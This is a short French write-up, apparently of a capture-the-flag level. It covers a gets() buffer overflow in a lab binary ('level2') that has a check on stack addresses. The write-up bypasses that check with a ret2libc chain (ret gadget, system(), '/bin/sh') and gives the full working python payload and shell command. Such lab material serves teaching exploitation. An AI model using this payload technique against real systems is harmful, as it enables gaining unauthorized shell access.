On a une fonction dans le binaire qui s'appelle p

```gdb
0x08048545 <+6>:	call   0x80484d4 <p>
```

En la desassemblant

On constate que l'on a un buffer de 76 mais on ne peux pas l'exploiter directement car il y a une verification après l'appel a la fonction gets qui verifie que EIP ne pointe pas sur une adresse de la stack (0xb).

```gdb
0x080484fb <+39>:	and    eax,0xb0000000
0x08048500 <+44>:	cmp    eax,0xb0000000
```

Pour contourner cela on va réecrire une partie de la stack.

En faisant pointé EIP au retour de la fonction gets sur la fin de la fonction p la prochaine instruction sera mis dans EIP et c'est la que l'on va executer notre "/bin/sh"

composition de la stack

EIP après gets		-> address de ret de p()
EIP après ret de p() 	-> address de system()
EIP après system() 	-> address de exit
Argument de system 	-> address de "/bin/sh"

```bash
python -c "print('A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'OSEF' + '\x58\xcc\xf8\xb7')" > /tmp/exploit2
cat /tmp/exploit2 - | ./level2
```